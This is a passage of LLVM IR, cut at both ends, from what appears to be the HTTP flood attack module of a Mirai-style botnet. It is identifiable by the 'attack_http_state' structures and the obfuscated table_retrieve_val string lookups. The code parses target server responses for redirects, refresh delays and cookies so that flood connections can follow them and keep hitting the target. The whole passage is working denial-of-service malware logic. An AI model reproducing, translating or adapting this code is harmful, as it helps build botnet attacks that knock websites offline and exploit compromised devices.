  %470 = icmp eq i32 %469, -1
  br i1 %470, label %482, label %471

; <label>:471:                                    ; preds = %458
  %472 = icmp sgt i32 %469, 1
  %473 = add nsw i32 %469, -2
  %.556 = select i1 %472, i32 %473, i32 %469
  %474 = add nsw i32 %.555, %.556
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %475
  store i8 0, i8* %476, align 1
  %477 = call i32 @util_strlen(i8* %467) #10
  %478 = call i8* @table_retrieve_val(i32 50, i32* null)
  %479 = call i32 @util_stristr(i8* %467, i32 %477, i8* %478) #10
  %480 = icmp eq i32 %479, 0
  br i1 %480, label %482, label %481

; <label>:481:                                    ; preds = %471
  store i32 1, i32* %454, align 4
  br label %482

; <label>:482:                                    ; preds = %471, %458, %453, %481
  %483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 13
  store i32 0, i32* %483, align 4
  %484 = call i8* @table_retrieve_val(i32 48, i32* null)
  %485 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %484) #10
  %486 = icmp eq i32 %485, -1
  br i1 %486, label %511, label %487

; <label>:487:                                    ; preds = %482
  %488 = call i8* @table_retrieve_val(i32 48, i32* null)
  %489 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %488) #10
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %490
  %492 = load i8, i8* %491, align 1
  %493 = icmp eq i8 %492, 32
  %494 = zext i1 %493 to i32
  %.557 = add nsw i32 %494, %489
  %495 = sext i32 %.557 to i64
  %496 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %495
  %497 = sub nsw i32 %430, %.557
  %498 = call i32 @util_memsearch(i8* %496, i32 %497, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %499 = icmp eq i32 %498, -1
  br i1 %499, label %511, label %500

; <label>:500:                                    ; preds = %487
  %501 = icmp sgt i32 %498, 1
  %502 = add nsw i32 %498, -2
  %.558 = select i1 %501, i32 %502, i32 %498
  %503 = add nsw i32 %.557, %.558
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %504
  store i8 0, i8* %505, align 1
  %506 = call i32 @util_strlen(i8* %496) #10
  %507 = call i8* @table_retrieve_val(i32 49, i32* null)
  %508 = call i32 @util_stristr(i8* %496, i32 %506, i8* %507) #10
  %509 = icmp eq i32 %508, 0
  br i1 %509, label %511, label %510

; <label>:510:                                    ; preds = %500
  store i32 1, i32* %483, align 4
  br label %511

; <label>:511:                                    ; preds = %500, %487, %482, %510
  %512 = call i8* @table_retrieve_val(i32 47, i32* null)
  %513 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %512) #10
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %.sink.split, label %515

; <label>:515:                                    ; preds = %511
  %516 = call i8* @table_retrieve_val(i32 47, i32* null)
  %517 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %516) #10
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %518
  %520 = load i8, i8* %519, align 1
  %521 = icmp eq i8 %520, 32
  %522 = zext i1 %521 to i32
  %.559 = add nsw i32 %522, %517
  %523 = sext i32 %.559 to i64
  %524 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %523
  %525 = sub nsw i32 %430, %.559
  %526 = call i32 @util_memsearch(i8* %524, i32 %525, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %.preheader589, label %528

; <label>:528:                                    ; preds = %515
  %529 = icmp sgt i32 %526, 1
  %530 = add nsw i32 %526, -2
  %.560 = select i1 %529, i32 %530, i32 %526
  %531 = add nsw i32 %.559, %.560
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %532
  store i8 0, i8* %533, align 1
  %534 = call i32 @util_atoi(i8* %524, i32 10) #10
  br label %.sink.split

.sink.split:                                      ; preds = %511, %528
  %.sink6 = phi i32 [ %534, %528 ], [ 0, %511 ]
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 14
  store i32 %.sink6, i32* %535, align 4
  br label %.preheader589

.preheader589:                                    ; preds = %515, %.sink.split
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 15
  %537 = call i8* @table_retrieve_val(i32 46, i32* null)
  %538 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %537) #10
  %539 = icmp eq i32 %538, -1
  br i1 %539, label %.critedge561, label %.lr.ph625.preheader

.lr.ph625.preheader:                              ; preds = %.preheader589
  br label %.lr.ph625

.lr.ph625:                                        ; preds = %.lr.ph625.preheader, %.loopexit
  %540 = phi i8* [ %.pre669, %.loopexit ], [ %21, %.lr.ph625.preheader ]
  %.0539624 = phi i32 [ %.pre666, %.loopexit ], [ 0, %.lr.ph625.preheader ]
  %541 = load i32, i32* %536, align 4
  %542 = icmp slt i32 %541, 5
  br i1 %542, label %543, label %.critedge561.loopexit

; <label>:543:                                    ; preds = %.lr.ph625
  %544 = call i8* @table_retrieve_val(i32 46, i32* null)
  %545 = call i32 @util_stristr(i8* %540, i32 %430, i8* %544) #10
  %546 = add nsw i32 %545, %.0539624
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %547
  %549 = load i8, i8* %548, align 1
  %550 = icmp eq i8 %549, 32
  %551 = zext i1 %550 to i32
  %.562 = add nsw i32 %551, %545
  %552 = sext i32 %.562 to i64
  %553 = getelementptr inbounds i8, i8* %540, i64 %552
  %554 = sub nsw i32 %430, %.0539624
  %555 = sub i32 %554, %.562
  %556 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %557 = icmp eq i32 %556, -1
  %.pre666 = add nsw i32 %.562, %.0539624
  %.pre667 = sext i32 %.pre666 to i64
  %.pre669 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre667
  br i1 %557, label %.loopexit, label %558

; <label>:558:                                    ; preds = %543
  %559 = icmp sgt i32 %556, 1
  %560 = add nsw i32 %556, -2
  %.563 = select i1 %559, i32 %560, i32 %556
  %561 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %562 = icmp sgt i32 %561, 0
  %563 = add nsw i32 %561, -1
  %..563 = select i1 %562, i32 %563, i32 %.563
  %564 = add nsw i32 %..563, %.pre666
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %565
  store i8 0, i8* %566, align 1
  store i32 0, i32* %5, align 4
  %567 = call i32 @util_strlen(i8* nonnull %.pre669) #10
  %568 = icmp sgt i32 %567, 0
  br i1 %568, label %.lr.ph619.preheader, label %._crit_edge620

.lr.ph619.preheader:                              ; preds = %558
  br label %.lr.ph619

; <label>:569:                                    ; preds = %.lr.ph619
  store i32 %577, i32* %5, align 4
  %570 = call i32 @util_strlen(i8* nonnull %.pre669) #10
  %571 = icmp slt i32 %577, %570
  br i1 %571, label %.lr.ph619, label %._crit_edge620.loopexit

.lr.ph619:                                        ; preds = %.lr.ph619.preheader, %569
  %572 = load i32, i32* %5, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds i8, i8* %.pre669, i64 %573
  %575 = load i8, i8* %574, align 1
  %576 = icmp eq i8 %575, 61
  %577 = add nsw i32 %572, 1
  br i1 %576, label %._crit_edge620.loopexit, label %569

._crit_edge620.loopexit:                          ; preds = %.lr.ph619, %569
  br label %._crit_edge620

._crit_edge620:                                   ; preds = %._crit_edge620.loopexit, %558
  %578 = load i32, i32* %5, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds i8, i8* %.pre669, i64 %579
  %581 = load i8, i8* %580, align 1
  %582 = icmp eq i8 %581, 61
  br i1 %582, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge620
  store i32 0, i32* %5, align 4
  %583 = load i32, i32* %536, align 4
  %584 = icmp sgt i32 %583, 0
  br i1 %584, label %.lr.ph623.preheader, label %.critedge564

.lr.ph623.preheader:                              ; preds = %.preheader
  br label %.lr.ph623

.lr.ph623:                                        ; preds = %.lr.ph623.preheader, %589
  %storemerge547622 = phi i32 [ %591, %589 ], [ 0, %.lr.ph623.preheader ]
  %585 = sext i32 %storemerge547622 to i64
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %585, i64 0
  %587 = call signext i8 @util_strncmp(i8* %.pre669, i8* %586, i32 %578) #10
  %588 = icmp eq i8 %587, 0
  br i1 %588, label %589, label %.loopexit.loopexit

; <label>:589:                                    ; preds = %.lr.ph623
  %590 = load i32, i32* %5, align 4
  %591 = add nsw i32 %590, 1
  store i32 %591, i32* %5, align 4
  %592 = load i32, i32* %536, align 4
  %593 = icmp slt i32 %591, %592
  br i1 %593, label %.lr.ph623, label %.critedge564.loopexit

.critedge564.loopexit:                            ; preds = %589
  br label %.critedge564

.critedge564:                                     ; preds = %.critedge564.loopexit, %.preheader
  %594 = call i32 @util_strlen(i8* %.pre669) #10
  %595 = icmp slt i32 %594, 128
  br i1 %595, label %596, label %.loopexit

; <label>:596:                                    ; preds = %.critedge564
  %597 = load i32, i32* %536, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %598, i64 0
  %600 = call i32 @util_strcpy(i8* %599, i8* %.pre669) #10
  %601 = load i32, i32* %536, align 4
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %536, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph623
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %543, %._crit_edge620, %.critedge564, %596
  %603 = call i8* @table_retrieve_val(i32 46, i32* null)
  %604 = call i32 @util_stristr(i8* %.pre669, i32 %430, i8* %603) #10
  %605 = icmp eq i32 %604, -1
  br i1 %605, label %.critedge561.loopexit, label %.lr.ph625

.critedge561.loopexit:                            ; preds = %.loopexit, %.lr.ph625
  br label %.critedge561

.critedge561:                                     ; preds = %.critedge561.loopexit, %.preheader589
  %606 = call i8* @table_retrieve_val(i32 45, i32* null)
  %607 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %606) #10
  %608 = icmp eq i32 %607, -1
  br i1 %608, label %701, label %609

; <label>:609:                                    ; preds = %.critedge561
  %610 = call i8* @table_retrieve_val(i32 45, i32* null)
  %611 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %610) #10
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %612
  %614 = load i8, i8* %613, align 1
  %615 = icmp eq i8 %614, 32
  %616 = zext i1 %615 to i32
  %.565 = add nsw i32 %616, %611
  %617 = sext i32 %.565 to i64
  %618 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %617
  %619 = sub nsw i32 %430, %.565
  %620 = call i32 @util_memsearch(i8* %618, i32 %619, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %621 = icmp eq i32 %620, -1
  br i1 %621, label %701, label %622

; <label>:622:                                    ; preds = %609
  %623 = icmp sgt i32 %620, 1
  %624 = add nsw i32 %620, -2
  %.566 = select i1 %623, i32 %624, i32 %620
  %625 = add nsw i32 %.565, %.566
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %626
  store i8 0, i8* %627, align 1
  %628 = add nsw i32 %.566, 1
  %629 = call i32 @util_memsearch(i8* %618, i32 %628, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %630 = icmp eq i32 %629, 4
  br i1 %630, label %631, label %676

; <label>:631:                                    ; preds = %622
  %632 = getelementptr inbounds i8, i8* %618, i64 4
  %633 = load i8, i8* %632, align 1
  %634 = icmp eq i8 %633, 115
  %.567 = select i1 %634, i32 8, i32 7
  store i32 %.567, i32* %5, align 4
  %635 = zext i32 %.567 to i64
  %636 = getelementptr inbounds i8, i8* %618, i64 %635
  %637 = sub nsw i32 %628, %.567
  %638 = sext i32 %637 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %618, i8* %636, i64 %638, i32 1, i1 false)
  br label %639

; <label>:639:                                    ; preds = %644, %631
  %indvars.iv653 = phi i64 [ %indvars.iv.next654, %644 ], [ 0, %631 ]
  %640 = getelementptr inbounds i8, i8* %618, i64 %indvars.iv653
  %641 = load i8, i8* %640, align 1
  switch i8 %641, label %644 [
    i8 0, label %.loopexit588
    i8 47, label %642
  ]

; <label>:642:                                    ; preds = %639
  %643 = trunc i64 %indvars.iv653 to i32
  store i32 %643, i32* %5, align 4
  store i8 0, i8* %640, align 1
  br label %646

; <label>:644:                                    ; preds = %639
  %indvars.iv.next654 = add nuw i64 %indvars.iv653, 1
  br label %639

.loopexit588:                                     ; preds = %639
  %645 = trunc i64 %indvars.iv653 to i32
  store i32 %645, i32* %5, align 4
  br label %646

; <label>:646:                                    ; preds = %.loopexit588, %642
  %647 = call i32 @util_strlen(i8* nonnull %618) #10
  %648 = icmp sgt i32 %647, 0
  br i1 %648, label %649, label %655

; <label>:649:                                    ; preds = %646
  %650 = call i32 @util_strlen(i8* nonnull %618) #10
  %651 = icmp slt i32 %650, 128
  br i1 %651, label %652, label %655

; <label>:652:                                    ; preds = %649
  %653 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %654 = call i32 @util_strcpy(i8* %653, i8* nonnull %618) #10
  br label %655

; <label>:655:                                    ; preds = %652, %649, %646
  %656 = load i32, i32* %5, align 4
  %657 = add nsw i32 %656, 1
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %618, i64 %658
  %660 = call i32 @util_strlen(i8* %659) #10
  %661 = icmp slt i32 %660, 256
  br i1 %661, label %662, label %700

; <label>:662:                                    ; preds = %655
  %663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %663, i32 255) #10
  %664 = load i32, i32* %5, align 4
  %665 = add nsw i32 %664, 1
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds i8, i8* %618, i64 %666
  %668 = call i32 @util_strlen(i8* %667) #10
  %669 = icmp sgt i32 %668, 0
  br i1 %669, label %670, label %700

; <label>:670:                                    ; preds = %662
  %671 = load i32, i32* %5, align 4
  %672 = add nsw i32 %671, 1
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds i8, i8* %618, i64 %673
  %675 = call i32 @util_strcpy(i8* %663, i8* %674) #10
  br label %700

; <label>:676:                                    ; preds = %622
  %677 = load i8, i8* %618, align 1
  %678 = icmp eq i8 %677, 47
  br i1 %678, label %679, label %700

; <label>:679:                                    ; preds = %676
  %680 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %680, i32 255) #10
  %681 = load i32, i32* %5, align 4
  %682 = add nsw i32 %681, 1
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %618, i64 %683
  %685 = call i32 @util_strlen(i8* %684) #10
  %686 = icmp sgt i32 %685, 0
  br i1 %686, label %687, label %700

; <label>:687:                                    ; preds = %679
  %688 = load i32, i32* %5, align 4
  %689 = add nsw i32 %688, 1
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %618, i64 %690
  %692 = call i32 @util_strlen(i8* %691) #10
  %693 = icmp slt i32 %692, 256
  br i1 %693, label %694, label %700

; <label>:694:                                    ; preds = %687
  %695 = load i32, i32* %5, align 4
  %696 = add nsw i32 %695, 1
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8, i8* %618, i64 %697
  %699 = call i32 @util_strcpy(i8* %680, i8* %698) #10
  br label %700

; <label>:700:                                    ; preds = %676, %694, %687, %679, %655, %670, %662
  store i8 1, i8* %417, align 4
  br label %.loopexit591

; <label>:701:                                    ; preds = %609, %.critedge561
  %702 = call i8* @table_retrieve_val(i32 44, i32* null)
  %703 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %702) #10
  %704 = icmp eq i32 %703, -1
  br i1 %704, label %864, label %705

; <label>:705:                                    ; preds = %701
  %706 = call i8* @table_retrieve_val(i32 44, i32* null)
  %707 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %706) #10
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %708
  %710 = load i8, i8* %709, align 1
  %711 = icmp eq i8 %710, 32
  %712 = zext i1 %711 to i32
  %.568 = add nsw i32 %712, %707
  %713 = sext i32 %.568 to i64
  %714 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %713
  %715 = sub nsw i32 %430, %.568
  %716 = call i32 @util_memsearch(i8* %714, i32 %715, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %717 = icmp eq i32 %716, -1
  br i1 %717, label %864, label %718

; <label>:718:                                    ; preds = %705
  %719 = icmp sgt i32 %716, 1
  %720 = add nsw i32 %716, -2
  %.569 = select i1 %719, i32 %720, i32 %716
  %721 = add nsw i32 %.568, %.569
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %722
  store i8 0, i8* %723, align 1
  br label %724

; <label>:724:                                    ; preds = %724, %718
  %indvars.iv655 = phi i64 [ %indvars.iv.next656, %724 ], [ 0, %718 ]
  %725 = getelementptr inbounds i8, i8* %714, i64 %indvars.iv655
  %726 = load i8, i8* %725, align 1
  %.off585 = add i8 %726, -48
  %727 = icmp ult i8 %.off585, 10
  %indvars.iv.next656 = add nuw i64 %indvars.iv655, 1
  br i1 %727, label %724, label %.critedge

.critedge:                                        ; preds = %724
  %728 = add nsw i32 %.569, 1
  %729 = trunc i64 %indvars.iv655 to i32
  store i32 %729, i32* %5, align 4
  %730 = icmp eq i8 %726, 0
  br i1 %730, label %864, label %731

; <label>:731:                                    ; preds = %.critedge
  store i8 0, i8* %725, align 1
  %732 = add nsw i32 %729, 1
  store i32 %732, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %714, i64 %733
  %735 = load i8, i8* %734, align 1
  %736 = icmp eq i8 %735, 32
  br i1 %736, label %737, label %739

; <label>:737:                                    ; preds = %731
  %738 = add nsw i32 %729, 2
  store i32 %738, i32* %5, align 4
  br label %739

; <label>:739:                                    ; preds = %737, %731
  %740 = phi i32 [ %738, %737 ], [ %732, %731 ]
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds i8, i8* %714, i64 %741
  %743 = call i32 @util_strlen(i8* %742) #10
  %744 = call i32 @util_stristr(i8* %742, i32 %743, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #10
  %745 = icmp eq i32 %744, -1
  %.pre665 = load i32, i32* %5, align 4
  br i1 %745, label %._crit_edge664, label %746

; <label>:746:                                    ; preds = %739
  %747 = sext i32 %.pre665 to i64
  %748 = getelementptr inbounds i8, i8* %714, i64 %747
  %749 = call i32 @util_strlen(i8* %748) #10
  %750 = call i32 @util_stristr(i8* %748, i32 %749, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #10
  %751 = load i32, i32* %5, align 4
  %752 = add nsw i32 %751, %750
  store i32 %752, i32* %5, align 4
  br label %._crit_edge664

._crit_edge664:                                   ; preds = %739, %746
  %753 = phi i32 [ %752, %746 ], [ %.pre665, %739 ]
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds i8, i8* %714, i64 %754
  %756 = load i8, i8* %755, align 1
  %757 = icmp eq i8 %756, 34
  br i1 %757, label %758, label %776

; <label>:758:                                    ; preds = %._crit_edge664
  %759 = add nsw i32 %753, 1
  store i32 %759, i32* %5, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds i8, i8* %714, i64 %760
  %762 = call i32 @util_strlen(i8* %761) #10
  %763 = add nsw i32 %762, -1
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds i8, i8* %761, i64 %764
  %766 = load i8, i8* %765, align 1
  %767 = icmp eq i8 %766, 34
  br i1 %767, label %768, label %776

; <label>:768:                                    ; preds = %758
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i8, i8* %714, i64 %770
  %772 = call i32 @util_strlen(i8* %771) #10
  %773 = add nsw i32 %772, -1
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8, i8* %771, i64 %774
  store i8 0, i8* %775, align 1
  br label %776

; <label>:776:                                    ; preds = %758, %768, %._crit_edge664
  %777 = call i32 @util_atoi(i8* nonnull %714, i32 10) #10
  %778 = add i32 %777, %379
  %779 = zext i32 %778 to i64
  %.off = add i32 %777, -1
  %780 = icmp ult i32 %.off, 9
  br i1 %780, label %.lr.ph629.preheader, label %.critedge12

.lr.ph629.preheader:                              ; preds = %776
  %781 = call i64 @time(i64* null) #10
  %782 = icmp sgt i64 %779, %781
  br i1 %782, label %.lr.ph629.preheader706, label %.critedge12

.lr.ph629.preheader706:                           ; preds = %.lr.ph629.preheader
  br label %.lr.ph629

.lr.ph629:                                        ; preds = %.lr.ph629.preheader706, %.lr.ph629
  %783 = call i32 @sleep(i32 1) #10
  %784 = call i64 @time(i64* null) #10
  %785 = icmp sgt i64 %779, %784
  br i1 %785, label %.lr.ph629, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph629
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph629.preheader, %776
  %786 = load i32, i32* %5, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %714, i64 %787
  %789 = call i32 @util_strlen(i8* %788) #10
  %790 = call i32 @util_stristr(i8* %788, i32 %789, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #10
  %791 = icmp eq i32 %790, 4
  br i1 %791, label %792, label %837

; <label>:792:                                    ; preds = %.critedge12
  %793 = getelementptr inbounds i8, i8* %788, i64 4
  %794 = load i8, i8* %793, align 1
  %795 = icmp eq i8 %794, 115
  %.572 = select i1 %795, i32 8, i32 7
  store i32 %.572, i32* %5, align 4
  %796 = zext i32 %.572 to i64
  %797 = getelementptr inbounds i8, i8* %788, i64 %796
  %798 = sub i32 %728, %.572
  %799 = sext i32 %798 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %788, i8* %797, i64 %799, i32 1, i1 false)
  br label %800

; <label>:800:                                    ; preds = %805, %792
  %indvars.iv657 = phi i64 [ %indvars.iv.next658, %805 ], [ 0, %792 ]
  %801 = getelementptr inbounds i8, i8* %788, i64 %indvars.iv657
  %802 = load i8, i8* %801, align 1
  switch i8 %802, label %805 [
    i8 0, label %.loopexit587
    i8 47, label %803
  ]

; <label>:803:                                    ; preds = %800
  %804 = trunc i64 %indvars.iv657 to i32
  store i32 %804, i32* %5, align 4
  store i8 0, i8* %801, align 1
  br label %807

; <label>:805:                                    ; preds = %800
  %indvars.iv.next658 = add nuw i64 %indvars.iv657, 1
  br label %800

.loopexit587:                                     ; preds = %800
  %806 = trunc i64 %indvars.iv657 to i32
  store i32 %806, i32* %5, align 4
  br label %807

; <label>:807:                                    ; preds = %.loopexit587, %803
  %808 = call i32 @util_strlen(i8* nonnull %788) #10
  %809 = icmp sgt i32 %808, 0
  br i1 %809, label %810, label %816

; <label>:810:                                    ; preds = %807
  %811 = call i32 @util_strlen(i8* nonnull %788) #10
  %812 = icmp slt i32 %811, 128
  br i1 %812, label %813, label %816

; <label>:813:                                    ; preds = %810
  %814 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %815 = call i32 @util_strcpy(i8* %814, i8* nonnull %788) #10
  br label %816

; <label>:816:                                    ; preds = %813, %810, %807
  %817 = load i32, i32* %5, align 4
  %818 = add nsw i32 %817, 1
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds i8, i8* %788, i64 %819
  %821 = call i32 @util_strlen(i8* %820) #10
  %822 = icmp slt i32 %821, 256
  br i1 %822, label %823, label %861

; <label>:823:                                    ; preds = %816
  %824 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %824, i32 255) #10
  %825 = load i32, i32* %5, align 4
  %826 = add nsw i32 %825, 1
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds i8, i8* %788, i64 %827
  %829 = call i32 @util_strlen(i8* %828) #10
  %830 = icmp sgt i32 %829, 0
  br i1 %830, label %831, label %861

; <label>:831:                                    ; preds = %823
  %832 = load i32, i32* %5, align 4
  %833 = add nsw i32 %832, 1
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds i8, i8* %788, i64 %834
  %836 = call i32 @util_strcpy(i8* %824, i8* %835) #10
  br label %861

; <label>:837:                                    ; preds = %.critedge12
  %838 = load i8, i8* %788, align 1
  %839 = icmp eq i8 %838, 47
  br i1 %839, label %840, label %861

; <label>:840:                                    ; preds = %837
  %841 = load i32, i32* %5, align 4
  %842 = add nsw i32 %841, 1
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8, i8* %788, i64 %843
  %845 = call i32 @util_strlen(i8* %844) #10
  %846 = icmp slt i32 %845, 256
  br i1 %846, label %847, label %861

; <label>:847:                                    ; preds = %840
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %848, i32 255) #10
  %849 = load i32, i32* %5, align 4
  %850 = add nsw i32 %849, 1
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds i8, i8* %788, i64 %851
  %853 = call i32 @util_strlen(i8* %852) #10
  %854 = icmp sgt i32 %853, 0
  br i1 %854, label %855, label %861

; <label>:855:                                    ; preds = %847
  %856 = load i32, i32* %5, align 4
  %857 = add nsw i32 %856, 1
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds i8, i8* %788, i64 %858
  %860 = call i32 @util_strcpy(i8* %848, i8* %859) #10
  br label %861

; <label>:861:                                    ; preds = %837, %847, %855, %840, %816, %831, %823
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %863 = bitcast i8* %862 to i32*
  store i32 5522759, i32* %863, align 1
  store i8 10, i8* %417, align 4
  br label %.loopexit591

; <label>:864:                                    ; preds = %.critedge, %705, %701
  %865 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %867 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #10
  %868 = icmp eq i8 %867, 0
  br i1 %868, label %869, label %874

; <label>:869:                                    ; preds = %864
  %870 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #10
  %871 = icmp eq i8 %870, 0
  br i1 %871, label %872, label %874

; <label>:872:                                    ; preds = %869
  %873 = icmp sgt i32 %430, %865
  %.sink13 = select i1 %873, i8 10, i8 1
  br label %874

; <label>:874:                                    ; preds = %864, %869, %872
  %storemerge542 = phi i8 [ %.sink13, %872 ], [ 7, %869 ], [ 7, %864 ]
  store i8 %storemerge542, i8* %417, align 4
  %875 = load i32, i32* %381, align 4
  %876 = sext i32 %865 to i64
  %877 = call i64 @recv(i32 %875, i8* nonnull %21, i64 %876, i32 16384) #10
  br label %.loopexit591

; <label>:878:                                    ; preds = %.preheader590, %.backedge
  %879 = load i32, i32* %419, align 4
  %880 = icmp eq i32 %879, 1024
  br i1 %880, label %881, label %882

; <label>:881:                                    ; preds = %878
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* nonnull %421, i64 960, i32 1, i1 false)
  store i32 960, i32* %419, align 4
  br label %882

; <label>:882:                                    ; preds = %881, %878
  %883 = tail call i32* @__errno_location() #11
  store i32 0, i32* %883, align 4
  %884 = load i32, i32* %381, align 4
  %885 = load i32, i32* %419, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %886
  %888 = sub nsw i32 1024, %885
  %889 = sext i32 %888 to i64
  %890 = call i64 @recv(i32 %884, i8* %887, i64 %889, i32 16384) #10
  %891 = trunc i64 %890 to i32
  switch i32 %891, label %897 [
    i32 0, label %.thread581
    i32 -1, label %892
  ]

.thread581:                                       ; preds = %882
